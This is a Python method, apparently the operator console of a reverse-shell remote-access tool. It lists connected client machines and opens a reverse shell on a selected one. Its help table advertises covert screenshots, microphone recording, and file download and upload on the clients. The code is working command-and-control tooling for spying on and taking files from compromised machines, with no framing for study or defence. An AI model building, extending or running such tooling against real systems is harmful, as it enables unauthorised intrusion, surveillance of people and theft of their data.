def start_interpreter(self):
    """Custom interpreter"""

    while True:
        command = input("interpreter $> ")

        if re.search(r"help\w*", command):
            # "help" is detected, print the help
            print("Interpreter usage:")
            print(
                tabulate.tabulate(
                    [
                        ["Command", "Usage"],
                        ["help", "Print this help message"],
                        ["list", "List all connected users"],
                        [
                            "use [machine_index]",
                            "Start reverse shell on the specified client, e.g 'use 1' will start the reverse shell on the second connected machine, and 0 for the first one.",
                        ],
                    ]
                )
            )

            print("=" * 30, "Custom commands inside the reverse shell", "=" * 30)

            print(
                tabulate.tabulate(
                    [
                        ["Command", "Usage"],
                        [
                            "abort",
                            "Remove the client from the connected clients",
                        ],
                        [
                            "exit|quit",
                            "Get back to interpreter without removing the client",
                        ],
                        [
                            "screenshot [path_to_img].png",
                            "Take a screenshot of the main screen and save it as an image file.",
                        ],
                        [
                            "recordmic [path_to_audio].wav [number_of_seconds]",
                            "Record the default microphone for number of seconds "
                            "and save it as an audio file in the specified file. "
                            "An example is 'recordmic test.wav 5' will record for 5 "
                            "seconds and save to test.wav in the current working directory",
                        ],
                        [
                            "download [path_to_file]",
                            "Download the specified file from the client",
                        ],
                        [
                            "upload [path_to_file]",
                            "Upload the specified file from your local machine to the client",
                        ],
                    ]
                )
            )

        elif re.search(r"list\w*", command):
            # list all the connected clients
            connected_clients = []

            for index, ((client_host, client_port), cwd) in enumerate(
                self.clients_cwd.items()
            ):
                connected_clients.append(
                    [index, client_host, client_port, cwd]
                )

            # print the connected clients in tabular form
            print(
                tabulate.tabulate(
                    connected_clients,
                    headers=["Index", "Address", "Port", "CWD"],
                )
            )

        elif (match := re.search(r"use\s*(\w*)", command)):
            try:
                # get the index passed to the command
                client_index = int(match.group(1))

            except ValueError:
                # there is no digit after the use command
                print("Please insert the index of the client, a number.")
                continue

            else:
                try:
                    self.current_client = list(self.clients)[client_index]

                except IndexError:
                    print(
                        f"Please insert a valid index, maximum is {len(self.clients)}."
                    )
                    continue

                else:
                    # start the reverse shell as self.current_client is set
                    self.start_reverse_shell()

        elif command.lower() in ["exit", "quit"]:
            # exit out of the interpreter if exit|quit are passed
            break

        elif command == "":
            # do nothing if command is empty (i.e a new line)
            pass

        else:
            print("Unavailable command:", command)

    self.close_connections()
